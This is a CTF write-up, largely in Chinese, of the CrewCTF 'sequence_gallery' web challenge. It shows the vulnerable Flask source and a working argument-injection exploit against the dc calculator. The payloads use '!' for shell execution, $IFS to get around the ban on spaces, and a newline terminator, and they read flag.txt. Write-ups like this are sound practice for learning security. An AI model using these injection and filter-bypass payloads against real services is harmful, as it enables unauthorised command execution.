---
title: CrewCTF - sequence_gallery
tags: [CTF, CrewCTF, Web]

category: "Security/Practice/CrewCTF/Web"
---

# CrewCTF - sequence_gallery
## Background
[Command Injection](https://lab.feifei.tw/practice/ci/l1.php)
[dc command in Linux with examples](https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/)
[Linux dc命令](https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html)
> dc -h
Usage: dc [OPTION] [file ...]
  -e, --expression=EXPR    evaluate expression
  -f, --file=FILE          evaluate contents of file
  -h, --help               display this help and exit
  -V, --version            output version information and exit
>
>Email bug reports to:  bug-dc@gnu.org .

## Source Code
:::spoiler Source Code
```python!
import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8080)

```
:::

## Recon
這一題看了一下source code，發現他只是用了sequence參數抓取`.dc`檔案，然後用subprocess另外執行，所以dc到底是一個甚麼樣的指令?看了其他網站[^dc_linux_command_eg][^linux_dc_command_zh]，發現它就只是一個calculator，然後他支援自己寫的腳本，所以他就是抓sequence這個get參數，然後做簡單的輸入字串驗證(不能有`flag`和空格)，所以可以想一下能不能用command injection的手法達到RCE，具體來說還是看了CTFTime上的WP[^CTFTime_WP]才知道可以用`!`接shell command，實際測試如下:
```bash!
$ dc -e \!ls
factorial.dc  fibonacchi.dc  flag.txt  main.py  power.dc  templates
```
```python!
$ python
>>> import subprocess
>>> subprocess.run(['dc', "-e !ls Web/sequence_gallery/dist/src"])
factorial.dc  fibonacchi.dc  flag.txt  main.py  power.dc  templates
CompletedProcess(args=['dc', '-e !ls Web/sequence_gallery/dist/src'], returncode=0)
```
兩者的區別是一般的shell需要特別用反斜線在驚嘆號前而在python的interactive mode不需要，所以我們就以python的環境來生成payload
:::warning
用一般的command injection做不出來，我試過`和$但都沒用，因為它是用subprocess去接所以格式不同，不然一般的shell是可以處理這些東西
:::
```python!
>>> subprocess.run(['dc', "`id`"])
dc: Could not open file `id`
CompletedProcess(args=['dc', '`id`'], returncode=0)
>>> subprocess.run(['dc', '"$(id)"'])
dc: Could not open file "$(id)"
CompletedProcess(args=['dc', '"$(id)"'], returncode=0)
```
## Exploit - Command Injection
1. 先測試一般的id能不能顯示
Payload: `-e !id` $\to$ Wrong(不能有空格)
Payloda: `-e%60!id` $\to$ Did not show(這邊試了很久，發現是我們的指令沒有一個換行)
Payload: `-e%60!id%0a` $\to$ Correct(所以其實中間的dummy string可以隨便設定以取代空格但一定要有換行)
2. 所以就可以用其他payload讀flag
    ```bash!
    /?sequence=-e`!ls%0A
    factorial.dc
    fibonacchi.dc
    flag.txt
    main.py
    power.dc
    templates
    '`' (0140) unimplemented 
    /?sequence=-e`!cat$IFS*.txt%0A
    crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}
    '`' (0140) unimplemented 
    ```
    :::info
    最後一個payload必須要是使用$IFS搭配*.txt，不能$IFSf*.txt，這樣會失敗，我想可能是因為字串之間會有衝突吧
    :::
    Flag: `crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}`

3. Trick
用`dc` command執行`10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx`會顯示`DouULikeDC`的字樣，算是作者的小趣味
## Reference
[^CTFTime_WP]:[CTFTime WP](https://ctftime.org/writeup/37413)
[^dc_linux_command_eg]:[dc command in Linux with examples](https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/)
[^linux_dc_command_zh]:[Linux dc命令](https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html)